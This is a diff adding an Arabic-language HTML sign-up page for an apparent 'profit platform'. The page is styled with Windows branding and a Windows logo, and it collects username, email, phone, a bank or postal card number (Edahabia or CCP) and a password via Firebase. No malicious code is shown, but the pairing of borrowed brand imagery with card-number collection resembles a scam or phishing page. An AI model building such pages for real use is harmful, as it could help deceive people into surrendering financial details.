@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب جديد - منصة الربح</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0078d4 0%, #6b69ae 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 12px;
+            padding: 40px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #000;
+        }
+
+        .windows-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .windows-logo img {
+            width: 60px;
+            height: 60px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #000;
+            font-weight: 600;
+            font-size: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.8);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .login-btn:hover {
+            background: #106ebe;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            gap: 10px;
+            font-size: 12px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin-top: 3px;
+        }
+
+        .checkbox-group label {
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .checkbox-group a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .checkbox-group a:hover {
+            text-decoration: underline;
+        }
+
+        .login-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .login-links a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-links a:hover {
+            text-decoration: underline;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .password-requirements {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin: 25px 0 15px 0;
+            color: #0078d4;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <div class="windows-logo">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 3.449L9.75 2.1V11.551H0V3.449ZM0 19.9V12.449H9.75V21.9L0 19.9ZM10.8 2.166L24 0V11.507H10.8V2.166ZM10.8 21.834V12.493H24V24L10.8 21.834Z" fill="#0078d4"/>
+                </svg>
+            </div>
+            
+            <h2>إنشاء حساب جديد</h2>
+            
+            <form id="registerForm">
+                <div class="section-title">المعلومات الشخصية</div>
+                
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="اسم المستخدم" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="tel" id="phone" placeholder="رقم الهاتف" required>
+                    </div>
+                </div>
+
+                <div class="section-title">المعلومات المالية</div>
+                
+                <div class="input-group">
+                    <input type="text" id="cardNumber" placeholder="رقم البطاقة الذهبية أو CCP" required>
+                </div>
+
+                <div class="section-title">كلمة المرور</div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                    <div class="password-requirements">يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="agreeTerms" required>
+                    <label for="agreeTerms">
+                        أوافق على <a href="privacy-policy.html">شروط الاستخدام</a> و <a href="privacy-policy.html">سياسة الخصوصية</a> 
+                        وأقر أن جميع المعلومات المقدمة صحيحة
+                    </label>
+                </div>
+                
+                <button type="submit" class="login-btn">إنشاء الحساب</button>
+            </form>
+            
+            <div class="login-links">
+                <a href="index.html">لديك حساب already؟ سجل الدخول</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script type="module" src="js/firebase-config.js"></script>
+    <script src="js/auth.js"></script>
+</body>
+</html>
